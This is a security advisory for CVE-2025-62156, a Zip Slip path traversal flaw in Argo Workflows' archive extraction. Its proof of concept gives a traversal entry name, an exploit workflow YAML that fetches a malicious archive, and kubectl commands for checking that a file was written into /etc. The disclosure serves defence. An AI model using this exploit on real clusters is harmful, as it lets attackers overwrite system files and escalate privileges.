# Argo Workflow has a Zipslip Vulnerability

**GHSA**: GHSA-p84v-gxvw-73pf | **CVE**: CVE-2025-62156 | **Severity**: high (CVSS 8.1)

**CWE**: CWE-22, CWE-23

**Affected Packages**:
- **github.com/argoproj/argo-workflows/v3** (go): < 3.6.12
- **github.com/argoproj/argo-workflows/v3** (go): >= 3.7.0, < 3.7.3

## Description

### **Vulnerability Description**

#### Vulnerability Overview

1. During the artifact extraction process, the `unpack()` function extracts the compressed file to a temporary directory (`/etc.tmpdir`) and then attempts to move its contents to `/etc` using the `rename()` system call,
2. However, since `/etc` is an already existing system directory, the `rename()` system call fails, making normal archive extraction impossible.
3. At this point, if a malicious user sets the entry name inside the `tar.gz` file to a path traversal like `../../../../../etc/zipslip-poc`,
4. The `untar()` function combines paths using `filepath.Join(dest, filepath.Clean(header.Name))` without path validation, resulting in `target = "/work/input/../../../../../etc/zipslip-poc"`,
5. Ultimately, the `/etc/zipslip-poc` file is created, bypassing the normal archive extraction constraints and enabling direct file writing to system directories.

#### untar(): Writing Files Outside the Extraction Directory

https://github.com/argoproj/argo-workflows/blob/946a2d6b9ac3309371fe47f49ae94c33ca7d488d/workflow/executor/executor.go#L993

1. **Base Path**: `/work/tmp` (dest) — The intended extraction directory in the wait container  
2. **Malicious Entry**: `../../../../../../../../../..//mainctrfs/etc/zipslip-ok.txt` (`header.Name`) — Path traversal payload  
3. **Path Cleaning**: `filepath.Clean("../../../../../../../../../..//mainctrfs/etc/zipslip-ok.txt") = /mainctrfs/etc/zipslip-ok.txt` — Go’s path cleaning normalizes the traversal  
4. **Path Joining**: `filepath.Join("/work/tmp", "/mainctrfs/etc/zipslip-ok.txt") = /mainctrfs/etc/zipslip-ok.txt` — Absolute path overrides base directory  
5. **File Creation**: `/mainctrfs/etc/zipslip-ok.txt` file is created in the wait container  
6. **Volume Mirroring**: The file appears as `/etc/zipslip-ok.txt` in the main container due to volume mount mirroring

### PoC

#### PoC Description

1. The user uploaded a malicious `tar.gz` file to S3 that contains path traversal entries like `../../../../../../../../../..//mainctrfs/etc/zipslip-ok.txt` designed to exploit the vulnerability.
2. In the Argo Workflows YAML, the artifact’s path is set to `/work/tmp`, which should normally extract the archive to that intended directory.
3. However, due to the vulnerability in the `untar()` function, `filepath.Join("/work/tmp", "/mainctrfs/etc/zipslip-ok.txt")` resolves to `/mainctrfs/etc/zipslip-ok.txt`, causing files to be created in unintended locations.
4. Since the wait container’s `/mainctrfs/etc` and the main container’s `/etc` share the same volume, files created in the wait container become visible in the main container’s `/etc/` directory.
5. Consequently, the archive that should extract to `/work/tmp` exploits the Zip Slip vulnerability to create files in the `/etc/` directory, enabling manipulation of system configuration files.

#### exploit yaml

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  generateName: zipslip-
spec:
  entrypoint: main
  templates:
  - name: main
    container:
      image: ubuntu:22.04
      command: ["sh"]
      args: ["-c", "echo 'Starting container'; sleep 3000"]
      volumeMounts:
      - name: etcvol
        mountPath: /etc
    inputs:
      artifacts:
      - name: evil
        path: /work/tmp  
        archive:
          tar: {}
        http:
          url: "https://zipslip-s3.s3.ap-northeast-2.amazonaws.com/etc-poc.tgz"
    volumes:
    - name: etcvol
      emptyDir: {}
```

#### exploit

1. Create Zipslip  
<img width="1300" height="102" alt="image (4)" src="https://github.com/user-attachments/assets/74569df1-43f9-409d-b905-601bcb5998e2" />

2. Upload S3  
<img width="1634" height="309" alt="image (5)" src="https://github.com/user-attachments/assets/2bf4a90a-0f03-411d-9a31-3c7de4b399b4" />


3. Create Workflow  
<img width="1875" height="865" alt="image (1) (1)" src="https://github.com/user-attachments/assets/fd01a4a7-c400-47a2-a8f0-427b0feabc7f" />


4. Run  
<img width="1799" height="862" alt="image (2)" src="https://github.com/user-attachments/assets/18a68919-1529-4ca0-9ed4-b71e271ae38f" />


5. Exploit Success
<img width="1363" height="440" alt="image (3)" src="https://github.com/user-attachments/assets/ac0e834d-4734-4771-9d24-d6fd1ce5d77f" />

   ```bash
   # Find Workflow and Pod
   NS=default
   WF=$(kubectl get wf -n "$NS" --sort-by=.metadata.creationTimestamp --no-headers | awk 'END{print $1}')
   POD=$(kubectl get pod -n "$NS" -l workflows.argoproj.io/workflow="$WF" --no-headers | awk 'END{print $1}')
   echo "NS=$NS WF=$WF POD=$POD"
   
   # Connect Main Container
   kubectl exec -it -n "$NS" "$POD" -c main -- bash
   
   # Exploit
   cd /etc/
   ls -l
   cat zipslip-ok.txt
   ```

### Impact

#### Container Isolation Bypass

The Zip Slip vulnerability allows attackers to write files to system directories like `/etc/` within the container, potentially overwriting critical configuration files such as `/etc/passwd`, `/etc/hosts`, or `/etc/crontab`, which could lead to privilege escalation or persistent access within the compromised container.
